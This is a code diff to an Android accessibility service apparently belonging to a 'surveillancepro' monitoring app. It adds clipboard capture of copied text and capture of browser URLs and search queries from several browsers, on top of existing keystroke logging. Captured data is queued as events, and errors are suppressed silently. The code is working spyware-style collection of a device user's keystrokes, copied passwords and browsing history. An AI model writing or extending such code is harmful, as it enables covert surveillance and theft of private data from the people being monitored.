@@ -1,6 +1,8 @@
 package com.surveillancepro.android.services
 
 import android.accessibilityservice.AccessibilityService
+import android.content.ClipboardManager
+import android.content.Context
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.surveillancepro.android.data.DeviceStorage
@@ -22,10 +24,29 @@ class SupervisionAccessibilityService : AccessibilityService() {
     private var keystrokeBuffer = ""
     private var keystrokeBufferPackage = ""
     private var keystrokeBufferStart = 0L
-    private val BUFFER_FLUSH_DELAY = 3000L // envoie après 3s d'inactivité
+    private val BUFFER_FLUSH_DELAY = 3000L
 
     private val handler = android.os.Handler(android.os.Looper.getMainLooper())
     private val flushRunnable = Runnable { flushKeystrokeBuffer() }
+
+    // Clipboard
+    private var lastClipText = ""
+    private var lastClipTime = 0L
+    private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null
+
+    // Chrome URL capture
+    private var lastChromeUrl = ""
+    private var lastChromeUrlTime = 0L
+    private val browserPackages = setOf(
+        "com.android.chrome", "com.chrome.beta", "com.chrome.dev",
+        "org.mozilla.firefox", "com.opera.browser", "com.brave.browser",
+        "com.microsoft.emmx", "com.samsung.android.app.sbrowser",
+    )
+
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        startClipboardMonitor()
+    }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
@@ -36,8 +57,12 @@ class SupervisionAccessibilityService : AccessibilityService() {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
             AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleFocusChanged(event)
             AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> handleNotification(event)
-            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleContentChanged(event)
-            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {} // ignoré volontairement
+            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                handleContentChanged(event)
+                handleBrowserUrlCapture(event)
+            }
+            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> handleBrowserUrlCapture(event)
+            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {}
         }
     }
 
@@ -178,6 +203,109 @@ class SupervisionAccessibilityService : AccessibilityService() {
         ))
     }
 
+    // ─── CLIPBOARD MONITOR ─────────────────────────────────────────────
+
+    private fun startClipboardMonitor() {
+        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager ?: return
+        clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
+            try {
+                val clip = cm.primaryClip ?: return@OnPrimaryClipChangedListener
+                if (clip.itemCount == 0) return@OnPrimaryClipChangedListener
+                val text = clip.getItemAt(0).coerceToText(applicationContext)?.toString() ?: return@OnPrimaryClipChangedListener
+                if (text.isBlank() || text.length > 5000) return@OnPrimaryClipChangedListener
+
+                val now = System.currentTimeMillis()
+                if (text == lastClipText && now - lastClipTime < 3000) return@OnPrimaryClipChangedListener
+                lastClipText = text
+                lastClipTime = now
+
+                val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
+                val queue = EventQueue.getInstance(applicationContext)
+                queue.enqueue("clipboard", mapOf(
+                    "text" to text.take(2000),
+                    "length" to text.length,
+                    "timestamp" to timestamp,
+                ))
+            } catch (_: Exception) {}
+        }
+        cm.addPrimaryClipChangedListener(clipboardListener)
+    }
+
+    // ─── BROWSER URL CAPTURE ─────────────────────────────────────────────
+
+    private fun handleBrowserUrlCapture(event: AccessibilityEvent) {
+        val packageName = event.packageName?.toString() ?: return
+        if (packageName !in browserPackages) return
+
+        val source = try { rootInActiveWindow } catch (_: Exception) { null } ?: return
+        try {
+            val urlBar = findUrlBar(source)
+            val url = urlBar?.text?.toString() ?: return
+            if (url.isBlank() || url.length < 4) return
+
+            val now = System.currentTimeMillis()
+            if (url == lastChromeUrl && now - lastChromeUrlTime < 5000) return
+            lastChromeUrl = url
+            lastChromeUrlTime = now
+
+            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
+            val queue = EventQueue.getInstance(applicationContext)
+
+            val isSearch = !url.contains("://") && !url.contains(".") && url.contains(" ")
+            if (isSearch) {
+                queue.enqueue("chrome_search", mapOf(
+                    "query" to url,
+                    "engine" to "Google",
+                    "browser" to readableBrowserName(packageName),
+                    "timestamp" to timestamp,
+                ))
+            } else {
+                queue.enqueue("chrome_page", mapOf(
+                    "url" to if (url.startsWith("http")) url else "https://$url",
+                    "title" to "",
+                    "browser" to readableBrowserName(packageName),
+                    "timestamp" to timestamp,
+                ))
+            }
+        } catch (_: Exception) {
+        }
+    }
+
+    private fun findUrlBar(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        val urlBarIds = listOf("url_bar", "url_field", "search_box_text", "mozac_browser_toolbar_url_view", "url")
+        for (id in urlBarIds) {
+            val nodes = root.findAccessibilityNodeInfosByViewId("${root.packageName}:id/$id")
+            if (!nodes.isNullOrEmpty()) return nodes[0]
+        }
+        // Fallback: chercher un EditText avec un texte qui ressemble à une URL
+        return findUrlEditText(root, 0)
+    }
+
+    private fun findUrlEditText(node: AccessibilityNodeInfo, depth: Int): AccessibilityNodeInfo? {
+        if (depth > 8) return null
+        if ((node.className?.toString()?.contains("EditText") == true || node.isEditable) && node.isFocusable) {
+            val text = node.text?.toString() ?: ""
+            if (text.contains(".") || text.contains("://")) return node
+        }
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            val result = findUrlEditText(child, depth + 1)
+            if (result != null) return result
+        }
+        return null
+    }
+
+    private fun readableBrowserName(pkg: String): String = when (pkg) {
+        "com.android.chrome" -> "Chrome"
+        "com.chrome.beta" -> "Chrome Beta"
+        "org.mozilla.firefox" -> "Firefox"
+        "com.opera.browser" -> "Opera"
+        "com.brave.browser" -> "Brave"
+        "com.microsoft.emmx" -> "Edge"
+        "com.samsung.android.app.sbrowser" -> "Samsung Internet"
+        else -> pkg.substringAfterLast(".")
+    }
+
     override fun onInterrupt() {
         flushKeystrokeBuffer()
     }
@@ -185,6 +313,10 @@ class SupervisionAccessibilityService : AccessibilityService() {
     override fun onDestroy() {
         flushKeystrokeBuffer()
         handler.removeCallbacks(flushRunnable)
+        clipboardListener?.let {
+            (getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager)
+                ?.removePrimaryClipChangedListener(it)
+        }
         super.onDestroy()
     }
 }
